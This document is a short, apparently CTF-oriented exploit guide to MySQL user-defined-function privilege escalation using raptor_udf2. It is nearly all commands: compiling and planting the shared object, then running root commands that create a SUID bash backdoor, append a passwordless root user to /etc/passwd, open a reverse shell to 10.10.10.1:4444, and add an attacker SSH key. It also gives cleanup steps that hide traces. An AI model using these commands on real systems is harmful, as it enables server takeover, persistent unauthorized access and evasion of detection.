## MySQL UDF Privilege Escalation

**Vulnerability Description:**
MySQL User Defined Functions (UDFs) allow extending MySQL with custom functions written in C/C++. If MySQL runs as root (common misconfiguration), an attacker with database FILE privilege and write access to the plugin directory can create a UDF that calls system() or executes shell commands, achieving code execution as the MySQL user (root).

**Exploit Commands:**
```bash
# Step 1: Connect to MySQL
mysql -u root -p -h localhost

# Step 2: Check MySQL user and privileges
SELECT user, host, super_priv FROM mysql.user;
SHOW GRANTS FOR 'root'@'localhost';
SELECT @@plugin_dir;
SHOW VARIABLES LIKE 'secure_file_priv';

# Step 3: Compile UDF shared object
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Step 4: Upload UDF to plugin directory
SELECT binary 0x<hex_encoded_sofar> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
# Or copy if local access:
cp raptor_udf2.so /usr/lib/mysql/plugin/

# Step 5: Create UDF function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

# Step 6: Execute commands as root
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash');
SELECT do_system('echo "haxor::0:0::/root:/bin/bash" >> /etc/passwd');
SELECT do_system('cat /root/flag.txt > /tmp/flag.txt');
SELECT do_system('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');

# Step 7: Verify
SELECT do_system('id > /tmp/id.txt');
```

**Post-Exploitation Steps:**
```bash
# Execute backdoor
/tmp/rootbash -p
id
cat /root/flag.txt

# Persistence
SELECT do_system('echo "ssh-rsa AAAA...attacker@evil" >> /root/.ssh/authorized_keys');

# Cleanup
DROP FUNCTION do_system;
DELETE FROM mysql.func WHERE name='do_system';
rm /usr/lib/mysql/plugin/raptor_udf2.so

